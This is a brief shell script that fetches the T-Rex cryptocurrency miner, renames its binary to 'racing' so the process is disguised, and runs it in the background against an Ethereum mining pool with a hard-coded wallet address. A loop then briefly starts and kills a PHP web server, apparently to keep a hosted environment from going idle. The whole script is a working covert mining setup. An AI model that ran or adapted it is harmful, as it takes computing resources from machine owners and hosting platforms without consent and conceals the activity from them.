cd /home
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
apt-get update
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -q -p x -w anohito &
touch index.php
x=1
while [ $x -le 5 ]
do
  echo "Welcome $x times"
  php -S 0.0.0.0:8080 &
  sleep 5
  killall php
  echo "Kill $x times"
  sleep 120
done
